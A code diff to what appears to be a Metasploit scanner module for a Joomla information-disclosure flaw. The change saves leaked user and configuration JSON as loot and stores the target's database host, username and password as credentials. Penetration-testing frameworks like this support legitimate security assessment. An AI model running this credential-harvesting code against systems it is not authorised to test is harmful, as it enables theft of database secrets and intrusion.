@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HTTP::Joomla
 
   def initialize(info = {})
@@ -93,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
       'Columns' => [ 'ID', 'Super User', 'Name', 'Username', 'Email', 'Send Email', 'Register Date', 'Last Visit Date', 'Group Names' ]
     )
 
-    loot_path = store_loot('joomla_users_json', 'application/json', datastore['RHOSTS'], ip, 'joomla_users.json')
+    loot_path = store_loot('joomla.users', 'application/json', ip, res.body, 'Joomla Users')
     print_good("Users JSON saved to #{loot_path}")
 
     users = res.get_json_document
@@ -130,29 +131,46 @@ class MetasploitModule < Msf::Auxiliary
       'Indent' => 1,
       'Columns' => [ 'Setting', 'Value' ]
     )
-
-    loot_path = store_loot('joomla_config_json', 'application/json', datastore['RHOSTS'], ip, 'joomla_config.json')
+    loot_path = store_loot('joomla.config', 'application/json', ip, res.body, 'Joomla Config')
     print_good("Config JSON saved to #{loot_path}")
 
     config = res.get_json_document
     config = config['data']
+    credential_data = {
+      protocol: 'tcp',
+      workspace_id: myworkspace_id,
+      port: 1, # we dont get this data back so just set it to something obviously wrong instead of guessing
+      origin_type: :service,
+      private_type: :password,
+      module_fullname: fullname,
+      status: Metasploit::Model::Login::Status::UNTRIED
+    }
     config.each do |setting|
       if setting['attributes'].key?('dbtype')
+        credential_data[:service_name] = setting['attributes']['dbtype'].to_s
+        if setting['attributes']['dbtype'].to_s == ''
+          credential_data[:port] = '3306' # taking a guess since this info isn't returned but is required for create_credential_and_login
+        end
         tbl << [ 'dbtype', setting['attributes']['dbtype'].to_s ]
       elsif setting['attributes'].key?('host')
+        credential_data[:address] = setting['attributes']['host'].to_s
         tbl << [ 'db host', setting['attributes']['host'].to_s ]
       elsif setting['attributes'].key?('password')
+        credential_data[:private_data] = setting['attributes']['password']
         tbl << [ 'db password', setting['attributes']['password'].to_s ]
       elsif setting['attributes'].key?('user')
+        credential_data[:username] = setting['attributes']['user'].to_s
         tbl << [ 'db user', setting['attributes']['user'].to_s ]
       elsif setting['attributes'].key?('db')
         tbl << [ 'db name', setting['attributes']['db'].to_s ]
       elsif setting['attributes'].key?('dbprefix')
         tbl << [ 'db prefix', setting['attributes']['dbprefix'].to_s ]
       elsif setting['attributes'].key?('dbencryption')
-        tbl << [ 'db prefix', setting['attributes']['dbencryption'].to_s ]
+        tbl << [ 'db encryption', setting['attributes']['dbencryption'].to_s ]
       end
     end
+    # if db host isn't a FQDN or IP, this will silently fail to save.
+    create_credential_and_login(credential_data)
 
     print_good(tbl.to_s)
   end
